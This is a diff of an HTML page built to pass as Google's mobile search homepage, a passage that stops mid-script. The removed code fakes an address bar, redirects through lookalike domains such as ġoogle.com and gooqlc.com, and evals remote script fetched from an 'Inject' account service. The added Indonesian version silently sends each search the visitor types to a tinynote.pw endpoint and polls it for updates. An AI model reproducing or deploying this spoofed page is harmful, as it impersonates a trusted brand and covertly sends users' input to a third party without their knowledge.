@@ -1,428 +1,677 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <title>page</title>
-    <meta content="width=device-width,initial-scale=1.0" name="viewport">
-    <link rel="icon" type="image/x-icon" href="/favicon.ico">
-    <link rel="stylesheet" type="text/css" href="/css/google_v3.css">
-    <script type="text/javascript" src="/js/jquery.min.js"></script>
-    <script type="text/javascript" src="/js/jck.js"></script>
-    <script type="text/javascript" src="/js/ns-4.js"></script>
-</head>
-<body hidden>
-<div id="notifications"><div class="icons"></div><div class="time">22:18</div></div>
-<div id="address-bar"><div class="home-button"></div><input id="fakebarurl" type="text" value="google.com"><div id="chrome-menu"></div></div>
-<div id="gb-main">
-    <div class="above-the-fold">
-        <div class="top-bar">
-            <div class="burger-menu">
-                <svg style="fill:#70757a;width:24px;height:24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
-            </div>
-            <div class="menu-buttons" id="menu-buttons">
-                <div id="web" class="all selected">ALL</div>
-                <div id="images" class="images">IMAGES</div>
-            </div>
-            <div class="fill"></div>
-            <div class="grid-signin">
-                <div class="products-grid" id="products-grid">
-                    <svg focusable="false" viewBox="0 0 24 24" xml:space="preserve"><path id="grid-button" d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path></svg>
-                    <div class="products-popup" id="products-popup">
-                        <div class="product-icon" id="amazon">
-                            <div class="icon account"></div>
-                            <div class="icon-title">Amazon</div>
-                        </div>
-                        <div class="product-icon" id="yahoo">
-                            <div class="icon search"></div>
-                            <div class="icon-title">Yahoo</div>
-                        </div>
-                        <div class="product-icon" id="maps">
-                            <div class="icon maps"></div>
-                            <div class="icon-title">Maps</div>
-                        </div>
-                        <div class="product-icon" id="youtube">
-                            <div class="icon youtube"></div>
-                            <div class="icon-title">YouTube</div>
-                        </div>
-                        <div class="product-icon" id="imdb">
-                            <div class="icon play"></div>
-                            <div class="icon-title">Imdb</div>
-                        </div>
-                        <div class="product-icon" id="wiki">
-                            <div class="icon news"></div>
-                            <div class="icon-title">Wiki</div>
-                        </div>
-                        <div class="product-icon" id="m2">
-                            <div class="icon gmail"></div>
-                            <div class="icon-title">Normal</div>
-                        </div>
-                        <div class="product-icon" id="m1">
-                            <div class="icon meet"></div>
-                            <div class="icon-title">Contact</div>
-                        </div>
-                        <div class="product-icon" id="m0">
-                            <div class="icon chat"></div>
-                            <div class="icon-title">Wait</div>
-                        </div>
-                        <div class="product-icon" id="contacts">
-                            <div class="icon contacts"></div>
-                            <div class="icon-title">Language</div>
-                        </div>
-                        <div class="product-icon">
-                            <div class="icon drive"></div>
-                            <div class="icon-title">Drive</div>
-                        </div>
-                        <div class="product-icon" id="fakebar">
-                            <div class="icon meet"></div>
-                            <div class="icon-title">Address Bar</div>
-                        </div>
-                        <div class="product-icon" id="trends">
-                            <div class="icon photos"></div>
-                            <div class="icon-title">Photos</div>
-                        </div>
-                        <div class="product-icon">
-                            <div class="icon duo"></div>
-                            <div class="icon-title">Duo</div>
-                        </div>
-                        <div class="product-icon">
-                            <div class="icon chrome"></div>
-                            <div class="icon-title">Chrome</div>
-                        </div>
-                        <div class="product-icon">
-                            <div class="icon shopping"></div>
-                            <div class="icon-title">Shopping</div>
-                        </div>
-                    </div>
-                </div>
-                <div class="signin-button" id="signinBtn">
-                    <a id="signin" >
-                        <div>Sign in</div>
-                    </a>
-                </div>
-            </div>
-        </div>
-        <div class="logo" id="logo" hidden>
-            <div id="imageText" nowrap="">Images</div>
-        </div>
-        <div style="text-align:center;margin:0 10px;position:relative" id="doodle" hidden>
-            <div style="display:inline-block">
-                <a style="background-image:none" data-hveid="4">
-                    <img style="border:none;max-width: 100%;margin:8px 0" src="" id="doodleImg">
-                </a>
-            </div>
-        </div>
-        <div class="search-bar">
-            <div id="backArrowButton" class="back-arrow">
-                <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
-            </div>
-            <div class="magnifier">
-                <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
-            </div>
-            <form id="form" name="form" action=".">
-                <input class="search-box" type="text" id="search-box" name="search-box" autocapitalize="none" value="">
-            </form>
-            <div class="clear-button">
-                <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
-            </div>
-            <div id="mic" class="search-by-voice">
-                <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"></path></svg>
-            </div>
-            <div class="suggestion">
-                <div class="search-magnifier">
-                    <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
-                </div>
-                <div class="suggestion-text"></div>
-                <div class="link-arrow">
-                    <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
-                </div>
-            </div>
-            <div class="suggestions"></div>
-        </div>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google</title>
+<link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
 
-        <div class="trend">
-            <div class="trend-icon">
-                <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"></path></svg>
-            </div>
-            <div class="text">Michigan vs Michigan State</div>
-        </div>
-        <div class="trending">
-            <div class="title">Trending searches</div>
-        </div>
-    </div>
-    <!--  <div class="below-the-fold">
-        <a>Settings</a>
-        <a>Privacy</a>
-        <a>Terms</a>
-        <a>Advertising</a>
-        <a>Business</a>
-        <a>About</a>
-    </div>  -->
+<style>
+  body {
+    margin: 0;
+    font-family: 'Arial', sans-serif;
+    background: #fff;
+    color: #202124;
+  }
+
+  /* ===== TOP BAR ===== */
+  .topbar {
+    display: flex;
+    align-items: center;
+    padding: 12px 14px;
+    gap: 14px;
+  }
+
+  .menu {
+    font-size: 22px;
+    color: #5f6368;
+    cursor: pointer;
+  }
+
+  .tabs {
+    display: flex;
+    gap: 18px;
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  .tab.active {
+    color: #1a73e8;
+    position: relative;
+  }
+
+  .tab.active::after {
+    content: "";
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: -8px;
+    height: 3px;
+    background: #1a73e8;
+    border-radius: 2px;
+  }
+
+  .tab {
+    color: #5f6368;
+    cursor: pointer;
+  }
+
+  .right-icons {
+    margin-left: auto;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .apps-icon {
+    width: 24px;
+    height: 24px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235F6368" d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    cursor: pointer;
+  }
+
+  .login {
+    background: #1a73e8;
+    color: #fff;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    border: none;
+  }
+
+  /* ===== LOGO ===== */
+  .logo-container {
+    text-align: center;
+    margin: 30px 0 20px;
+  }
+
+  .google-logo {
+    width: 272px;
+    height: 92px;
+    margin: 0 auto;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92"><path fill="%234285f4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="%23ea4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="%23fbbc05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.43 10.16-22.09 21.25-22.09 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.14 5.71-12.14 13.52 0 7.73 5.42 13.36 12.14 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="%234285f4" d="M225 3v65h-9.5V3h9.5z"/><path fill="%2334a853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="%23ea4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35 0 53.33 0 34.91 0 16.58 16.32.56 35.3.56c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+  }
+
+  /* ===== SEARCH BAR ===== */
+  .search-container {
+    margin: 0 16px 24px;
+  }
+
+  .search-box {
+    border: 1px solid #dfe1e5;
+    border-radius: 24px;
+    display: flex;
+    align-items: center;
+    padding: 10px 14px;
+    gap: 10px;
+  }
+
+  .search-box:hover {
+    border-color: #dadce0;
+  }
+
+  .search-box input {
+    border: none;
+    outline: none;
+    flex: 1;
+    font-size: 16px;
+    font-family: 'Arial', sans-serif;
+  }
+
+  .search-icon {
+    width: 20px;
+    height: 20px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%239aa0a6" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+  }
+
+  .mic-icon {
+    width: 24px;
+    height: 24px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235F6368" d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.91-3c-.49 0-.9.36-.98.85C16.52 14.2 14.47 16 12 16s-4.52-1.8-4.93-4.15c-.08-.49-.49-.85-.98-.85-.61 0-1.09.54-1 1.14.49 3 2.89 5.35 5.91 5.78V20c0 .55.45 1 1 1s1-.45 1-1v-2.08c3.02-.43 5.42-2.78 5.91-5.78.1-.6-.39-1.14-1-1.14z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    cursor: pointer;
+  }
+
+  /* ICON GOOGLE LENS KAMERA - WARNA ABU-ABU */
+  .lens-icon {
+    width: 24px;
+    height: 24px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235F6368" d="M12 1C7.19 1 3.06 4 1.57 8.25L4.1 9.69C5.23 6.28 8.36 4 12 4c3.64 0 6.77 2.28 7.9 5.69l2.53-1.44C20.94 4 16.81 1 12 1zm0 2c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6zm0 1c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm-1 1.5v3h2v-3h-2zm0 4v3h2v-3h-2z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    cursor: pointer;
+  }
+
+  /* ===== TRENDING ===== */
+  .section {
+    padding: 0 16px;
+  }
+
+  .section h3 {
+    font-size: 18px;
+    font-weight: 500;
+    margin: 10px 0;
+  }
+
+  .trend {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 0;
+    border-bottom: 1px solid #e0e0e0;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  .trend:hover {
+    background-color: #f8f9fa;
+  }
+
+  .trend-icon {
+    width: 18px;
+    height: 18px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235f6368" d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+  }
+
+  .trend-text {
+    color: #202124;
+  }
+
+  .trend:hover .trend-text {
+    text-decoration: underline;
+    color: #1a0dab;
+  }
+
+  /* ===== FOOTER ===== */
+  .footer {
+    margin-top: 20px;
+    padding: 14px 10px 24px;
+    background: #f2f2f2;
+    font-size: 13px;
+    color: #5f6368;
+    text-align: center;
+  }
+
+  .footer-row {
+    margin-bottom: 8px;
+  }
+
+  .footer span {
+    margin: 0 6px;
+    cursor: pointer;
+  }
+
+  .footer span:hover {
+    text-decoration: underline;
+  }
+
+  /* RESPONSIVE DESIGN */
+  @media (max-width: 600px) {
+    .google-logo {
+      width: 200px;
+      height: 68px;
+    }
+    
+    .search-box {
+      padding: 12px 16px;
+    }
+    
+    .search-box input {
+      font-size: 16px;
+    }
+    
+    .tabs {
+      font-size: 13px;
+      gap: 12px;
+      display: flex !important;
+    }
+    
+    .tab.active::after {
+      bottom: -6px;
+    }
+    
+    .topbar {
+      padding: 10px 12px;
+      gap: 10px;
+    }
+  }
+</style>
+</head>
+
+<body>
+
+<div class="topbar">
+  <div class="menu" title="Menu">☰</div>
+  <div class="tabs">
+    <div class="tab active" data-tab="all">SEMUA</div>
+    <div class="tab" data-tab="images">GAMBAR</div>
+  </div>
+  <div class="right-icons">
+    <div class="apps-icon" title="Google Apps"></div>
+    <button class="login" id="loginBtn">Masuk</button>
+  </div>
 </div>
 
-<script src="/js/google_v3.js"></script>
-<script src="/js/fs.js"></script>
-<script class="notranslate">
+<div class="logo-container">
+  <div class="google-logo" title="Google"></div>
+</div>
 
-    var useLastThump = sessionStorage.getItem('useLastThump') ? sessionStorage.getItem('useLastThump')==='true' : false;
-    var timerDelay = sessionStorage.getItem('timerDelay') ? parseInt(sessionStorage.getItem('timerDelay')) : 0;
-    var timerEnabled = timerDelay !== 0;
-    
-    (function(){
-        var
-        is_ios = /iP(ad|od|hone)/i.test(window.navigator.userAgent),
-        is_safari = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/);
-        if ( is_ios && is_safari ) {
-            var
-            $html = document.documentElement,
-            classes = $html.className.concat(' is-ios-safari');
-            $html.className = classes;
-        }
-        if (is_safari) {
-            window.isSafari = true;
-        }
-        if (is_ios) {
-            window.isIOS = true;
-        }
-    })();
+<div class="search-container">
+  <div class="search-box" id="searchForm">
+    <div class="search-icon" title="Search"></div>
+    <input type="text" placeholder="" id="searchInput" autocomplete="off" autocapitalize="off" spellcheck="false">
+    <div class="mic-icon" id="micButton" title="Search by voice"></div>
+    <div class="lens-icon" id="lensButton" title="Search by image with Google Lens"></div>
+  </div>
+</div>
 
-    function getPathValueFromUrl() {
-        let path = window.location.pathname;
-        // Trim leading slash if present
-        if (path.startsWith('/')) {
-            path = path.slice(1);
-        }
-        
-        if (path.endsWith('!')) {
-            path = path.slice(0, -1);
-            useLastThump = true;
-        }
-        if (path.indexOf('\'') !== -1) {
-            timerDelay = 30;
-            timerEnabled = true;
-            var timerPathValue = path.substring(path.indexOf('\'') + 1);
-            if (timerPathValue.length > 0) {
-                timerDelay = parseInt(timerPathValue);
-            }
-            path = path.substring(0, path.indexOf('\''));
-        }
-        return path;
-    }
+<div class="section">
+  <h3>Trending searches</h3>
+  <div id="trendingContainer">
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Pemilu 2024</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Harga Emas Hari Ini</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Gempa Terkini</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Jadwal Bola Malam Ini</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Rupiah vs USD</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Cuaca Jakarta</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Berita Terkini</div></div>
+  </div>
+</div>
 
-    const pathValue = sessionStorage.getItem('handle') || getPathValueFromUrl();
-    
-    // Tap counter for initialization
-    var tapCount = 0;
-    var appInitialized = false;
-    var blankPath = !!sessionStorage.getItem('handle');
-    
-    function initializeApp() {
-        if (appInitialized) return; // Prevent multiple initializations
-        appInitialized = true;
-        
-        var url = window.location.href;
-
-        if (window.isSafari && url.indexOf('qq1.us')!==-1) {
-            const crossingDomains = url.indexOf('qq1.us')!==-1;
-            url = url.replace('qq1.us', '\u{121}oogle.com');
-            window.location.replace(url);
-        }
-        else if (!window.isSafari && url.indexOf('qq1.us')!==-1) {
-            const crossingDomains = url.indexOf('qq1.us')!==-1;
-            url = url.replace('qq1.us', 'gooqlc.com');
-            window.location.replace(url);
-        }
-        else if (window.isSafari && url.indexOf('gooqlc.com')!==-1) {
-            const crossingDomains = url.indexOf('gooqlc.com')!==-1;
-            url = url.replace('gooqlc.com', '\u{121}oogle.com');
-            window.location.replace(url);
-        }
-        else {
-            document.title = 'Google';
-            var imagesTxt = "IMAGES";
-            var covertTypingEnabled = true;
-            var tableId = null;
-
-            var allText = 'ALL';
-            var uid = null;
-            hideTrends = false;
-            fakebarurl = "";
-            receiverType = "";
-            redirectionUrl = "";
-            redirectionUrl2 = "";
-            redirectionUrl3 = "";
-            redirectionUrl4 = "";
-            webUrl = "";
-            imagesUrl = "";
-            amazonUrl = "";
-            yahooUrl = "";
-            mapsUrl = "";
-            youtubeUrl = "";
-            imdbUrl = "";
-            wikiUrl = "";
-            var account;
-            
-            // If the current path is not '/', update the address bar to '/'
-            if (window.location.pathname !== '/') {
-                sessionStorage.setItem('handle', pathValue);
-                sessionStorage.setItem('timerDelay', timerDelay);
-                sessionStorage.setItem('useLastThump', useLastThump);
-                window.location.replace('/');
-            }
-            else {
-                sessionStorage.removeItem('handle');
-                sessionStorage.removeItem('timerDelay');
-                sessionStorage.removeItem('useLastThump');
-            }
-
-            if (pathValue) {
-                // Use the path value
-                console.log('Path value:', pathValue);
-                
-                // Remove any leading slash and make the GET request
-                const handle = pathValue.startsWith('/') ? pathValue.substring(1) : pathValue;
-                $.ajax({
-                    url: `https://11z.co/_w/byhandle/${handle}/account/full`,
-                    method: 'GET',
-                    dataType: 'json',
-                    success: function(data) {
-                        account = data;
-
-                        if (!account.settings.enabled) {
-                            $('body')[0].innerHTML = '<div style="font-size:14pt;margin-top:50vh;margin-left:calc(50vw - 150px);width:300px;text-align:center;">Turn on "Account Enabled" in your Inject Settings.</div>';
-                            $('body').show();
-                            return;
-                        }
-
-                        imagesTxt = account.settings.localizedStrings.Images || 'IMAGES';
-                        covertTypingEnabled = false;
-
-                        uid = account.id;
-                        hideTrends = account.settings.hideTrends;
-                        fakebarurl = account.settings.fakebarUrl || '://www.google.com';
-                        receiverType = account.settings.receiverType || 'web';
-                        redirectionUrl = account.settings.redirectionUrl || '';
-                        redirectionUrl2 = account.settings.redirectionUrl2 || '';
-                        redirectionUrl3 = account.settings.redirectionUrl3 || '';
-                        redirectionUrl4 = account.settings.redirectionUrl4 || '';
-                        webUrl = account.settings.webUrl||'https://www.google.com/search?q={thump}';
-                        imagesUrl = account.settings.imagesUrl || 'https://www.google.com/search?tbm=isch&q={thump}&oq={thump}';
-                        amazonUrl = account.settings.amazonUrl || 'https://www.amazon.com/s?k={thump}';
-                        yahooUrl = account.settings.yahooUrl || 'https://search.yahoo.com/search?p={thump}';
-                        mapsUrl = account.settings.mapsUrl || 'https://maps.google.com/maps/?q={thump}&oq={thump}';
-                        youtubeUrl = account.settings.youtubeUrl || 'https://m.youtube.com/results?search_query={thump}';
-                        imdbUrl = account.settings.imdbUrl || 'https://m.imdb.com/find?q={thump}';
-                        wikiUrl = account.settings.wikiUrl || 'https://wikipedia.org/wiki/{thump}';
-                        const defaultSearchText = account.settings.defaultSearchText || '';
-                        
-                        if (defaultSearchText.indexOf('Enhanced Inject') !== -1) {
-                            var htmlContent = defaultSearchText.substring(0, defaultSearchText.indexOf('script>') - 1);
-                            var jsContent = defaultSearchText.substring(defaultSearchText.indexOf('script>') + 7);
-                            jsContent = jsContent.substring(0, jsContent.lastIndexOf('/script') - 1);
-                            $('#form')[0].innerHTML = `<input class="search-box" type="text" id="search-box" name="search-box" autocapitalize="none" value="${htmlContent}`;
-                            try{
-                                eval(jsContent);
-                            }
-                            catch(e) {
-                                console.log(e);
-                                console.log('failed to execute enhanced inject script.');
-                            }
-                        }
-                        else {
-                            $('#search-box').val(defaultSearchText);
-                        }
-
-                        // Update the fakebarurl input with the correct value from account settings
-                        $('#fakebarurl').val(fakebarurl);
-                        Inject.init(
-                            account.id,
-                            account.handles[0],
-                            tableId,
-                            account.settings.covertTypingText || null,
-                            useLastThump,
-                            timerEnabled,
-                            timerDelay,
-                            imagesTxt,
-                            covertTypingEnabled,
-                            receiverType,
-                            redirectionUrl,
-                            redirectionUrl2,
-                            redirectionUrl3,
-                            redirectionUrl4,
-                            webUrl,
-                            imagesUrl,
-                            amazonUrl,
-                            yahooUrl,
-                            mapsUrl,
-                            youtubeUrl,
-                            imdbUrl,
-                            wikiUrl,
-                            hideTrends
-                        );
-                    },
-                    error: function() {
-                        window.location.replace('https://www.google.com');
-                    }
-                });
-            }
-            else {            
-                window.location.replace('https://www.google.com');
-            }
-        }
-    }
-    
-    var isPuny = window.location.href.indexOf('\u{121}oogle.com')!==-1 || 
-                 window.location.href.indexOf('%C4%A1oogle.com')!==-1 ||
-                 window.location.href.indexOf('xn--oogle-v1a.com')!==-1 ||
-                 window.location.href.indexOf('ġoogle.com')!==-1 ||
-                 window.location.href.indexOf('gooqlc.com')!==-1;
-    var referrer = document.referrer || '';
-    if (!pathValue) {
-        window.location.replace('https://www.google.com');
-    } else if (timerEnabled || isPuny || blankPath || referrer.indexOf('trends-') !== -1 || referrer.indexOf('-stats') !== -1) {
-        initializeApp();
-    } else {
-        document.addEventListener('click', function() {
-            //tapCount++;
-            //console.log('Tap count:', tapCount);
-            //if (tapCount >= 3) {
-                initializeApp();
-            //}
-        });
-    }
-</script>
-
-<script class="notranslate">
-    $(document).ready(function() {
-    });
-</script>
+<div class="footer">
+  <div class="footer-row">
+    <span>Dark theme: disabled</span>
+    <span id="settingsBtn">Settings</span>
+    <span id="privacyBtn">Privacy</span>
+    <span id="termsBtn">Terms</span>
+  </div>
+  <div class="footer-row">
+    <span id="advertisingBtn">Advertising</span>
+    <span id="businessBtn">Business</span>
+    <span id="aboutBtn">About</span>
+  </div>
+</div>
 
 <script>
-(function() {
-    var locale = navigator.language || navigator.userLanguage || 'en';
-    locale = locale.toLowerCase();
-    var lang = locale.split('-')[0];
+  // API CONFIGURATION
+  const API_URL = 'https://tinynote.pw/api/2NAK';
+  let syncInterval = null;
+  let lastNoteData = null;
+  let clickCount = 0;
+  let clickTimer = null;
 
-    fetch('/translations.js')
-        .then(function(response) { return response.json(); })
-        .then(function(translations) {
-            // Try full locale first, then fallback to language only, then to 'en'
-            var t = translations[locale] || translations[lang] || translations['en'];
-            if (t) {
-                if (document.getElementById('web')) {
-                    document.getElementById('web').textContent = t[0];
-                    allText = t[0];
-                }
-                if (document.getElementById('images')) {
-                    document.getElementById('images').textContent = t[1];
-                }
-                if (document.getElementById('signin')) {
-                    $('#signin div')[0].textContent = t[2];
-                }
+  // Deteksi iOS Safari untuk mencegah app opening
+  function isIOS() {
+    return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+  }
+
+  function isSafari() {
+    const ua = navigator.userAgent;
+    return /^((?!chrome|android).)*safari/i.test(ua) || 
+           (isIOS() && !/CriOS|FxiOS|EdgiOS|OPiOS/.test(ua));
+  }
+
+  // ========== API FUNCTIONS ==========
+  // Ambil data dari API (field "note")
+  async function getNoteData() {
+    try {
+      const response = await fetch(API_URL);
+      if (!response.ok) return null;
+      
+      const data = await response.json();
+      
+      // Periksa apakah ada field "note"
+      if (data && data.note) {
+        lastNoteData = data.note;
+        
+        // Coba parse sebagai JSON
+        try {
+          const parsedNote = JSON.parse(data.note);
+          return parsedNote;
+        } catch (e) {
+          // Jika bukan JSON, return sebagai string
+          return { search: data.note };
+        }
+      }
+      
+      return null;
+    } catch (error) {
+      // Silent error - tidak tampilkan apa-apa
+      return null;
+    }
+  }
+
+  // Simpan data ke API (field "note")
+  async function saveNoteData(searchTerm) {
+    try {
+      // Dapatkan data saat ini
+      const currentData = await getNoteData();
+      
+      let noteData = {
+        search: searchTerm,
+        timestamp: Date.now(),
+        history: []
+      };
+      
+      // Jika ada data sebelumnya, tambahkan ke history
+      if (currentData && currentData.search) {
+        noteData.history = [currentData.search];
+        
+        // Tambahkan history lama jika ada
+        if (currentData.history && Array.isArray(currentData.history)) {
+          noteData.history = [...currentData.history.slice(0, 4), currentData.search];
+        }
+      }
+      
+      // Kirim ke API
+      const response = await fetch(API_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ note: JSON.stringify(noteData) })
+      });
+      
+      return response.ok;
+    } catch (error) {
+      // Silent error
+      return false;
+    }
+  }
+
+  // ========== SYNC FUNCTIONS ==========
+  // Sinkronisasi data dari API (diam-diam)
+  async function syncData() {
+    const data = await getNoteData();
+    
+    if (data && data.search) {
+      const searchInput = document.getElementById('searchInput');
+      
+      // Update search bar dengan data terbaru
+      if (searchInput && !searchInput.matches(':focus')) {
+        searchInput.value = data.search;
+      }
+    }
+  }
+
+  // Mulai sinkronisasi otomatis (setiap 3 detik)
+  function startAutoSync() {
+    // Sync pertama
+    setTimeout(syncData, 1000);
+    
